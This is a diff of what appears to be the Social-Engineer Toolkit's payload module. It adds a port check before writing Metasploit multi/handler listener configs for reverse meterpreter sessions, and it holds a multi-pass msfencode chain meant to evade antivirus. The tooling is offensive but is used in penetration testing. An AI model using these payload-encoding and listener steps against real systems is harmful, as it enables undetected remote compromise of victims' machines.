@@ -293,7 +293,7 @@ try:
         check_write=file("src/program_junk/custom.exe", "w")
         check_write.write("VALID")
         check_write.close()
-        shutil.copyfile("%s" % (choice1), "msf.exe") #subprocess.Popen("cp %s msf.exe;cp msf.exe %s/src/html/msf.exe" % (choice1,definepath), shell=True).wait()
+        shutil.copyfile("%s" % (choice1), "msf.exe") 
         shutil.copyfile("msf.exe", "%s/src/program_junk/msf.exe" % (definepath))
 
     # Specify Encoding Option
@@ -455,8 +455,10 @@ try:
 
 					# here we prep our meta config to listen on all the ports we want - free hugs all around
 					filewrite = file("%s/src/program_junk/meta_config_multipyinjector" % (definepath), "a")
-					filewrite.write("use exploit/multi/handler\nset PAYLOAD %s\nset LHOST 0.0.0.0\nset LPORT %s\nset ExitOnSession false\nexploit -j\n\n" % (choice9,shellcode_port))
-					filewrite.close()
+	                                port_check = check_ports("%s/src/program_junk/meta_config_multipyinjector" % (definepath), shellcode_ports)
+        	                        if port_check == False:
+						filewrite.write("use exploit/multi/handler\nset PAYLOAD %s\nset LHOST 0.0.0.0\nset LPORT %s\nset ExitOnSession false\nexploit -j\n\n" % (choice9,shellcode_port))
+						filewrite.close()
 
 				if validate_ip(choice2) == False:
 					if choice9 != "windows/meterpreter/reverse_https":
@@ -637,7 +639,6 @@ try:
             if encode == "MULTIENCODE":
                 print_info("Encoding the payload multiple times to get around pesky Anti-Virus.")
                 encodepayload=subprocess.Popen(r"ruby %s/msfencode -e x86/shikata_ga_nai -i %s/src/program_junk/1msf.exe -t raw -c 5 | ruby %s/msfencode -t raw -e x86/alpha_upper -c 2 | ruby %s/msfencode -t raw -e x86/shikata_ga_nai -c 5 | ruby %s/msfencode -t exe -c 5 -e x86/countdown -o %s/src/program_junk/msf.exe" % (path,definepath,path,path,path,definepath), shell=True).wait()
-                #subprocess.Popen("cp src/html/msf.exe src/program_junk/ 1> /dev/null 2> /dev/null", shell=True).wait()
                 encode1=("x86/countdown")
 
             # If option 16, backdoor executable better AV avoidance
@@ -704,24 +705,26 @@ try:
             # if there isn't a multiattack metasploit, setup handler
             if not os.path.isfile("%s/src/program_junk/multi_meta" % (definepath)):
 
-                filewrite.write("use exploit/multi/handler\n")
-                filewrite.write("set PAYLOAD "+choice1+"\n")
-                filewrite.write("set LHOST 0.0.0.0" + "\n")
-                if flag == 0:
-                    filewrite.write("set LPORT "+choice3+"\n")
-
-                filewrite.write("set ExitOnSession false\n")
-
-                if auto_migrate == "ON":
-                        filewrite.write("set AutoRunScript post/windows/manage/smart_migrate\n")
-
-                # config option for using multiscript meterpreter
-                if meterpreter_multi == "ON":
-                    multiwrite=file("src/program_junk/multi_meter.file", "w")
-                    multiwrite.write(meterpreter_multi_command)        
-                    filewrite.write("set InitialAutorunScript multiscript -rc %s/src/program_junk/multi_meter.file\n" % (definepath))
-                    multiwrite.close()
-                filewrite.write("exploit -j\n\n")
+		port_check = check_ports("%s/src/program_junk/meta_config" % (definepath), choice3)
+                if port_check == False:
+	                filewrite.write("use exploit/multi/handler\n")
+	                filewrite.write("set PAYLOAD "+choice1+"\n")
+	                filewrite.write("set LHOST 0.0.0.0" + "\n")
+	                if flag == 0:
+	                    filewrite.write("set LPORT "+choice3+"\n")
+		
+	                filewrite.write("set ExitOnSession false\n")
+	
+	                if auto_migrate == "ON":
+	                        filewrite.write("set AutoRunScript post/windows/manage/smart_migrate\n")
+	
+	                # config option for using multiscript meterpreter
+	                if meterpreter_multi == "ON":
+	                    multiwrite=file("src/program_junk/multi_meter.file", "w")
+	                    multiwrite.write(meterpreter_multi_command)        
+	                    filewrite.write("set InitialAutorunScript multiscript -rc %s/src/program_junk/multi_meter.file\n" % (definepath))
+	                    multiwrite.close()
+	                filewrite.write("exploit -j\n\n")
 
                 # if we want to embed UNC paths for hashes
                 if unc_embed == "ON":
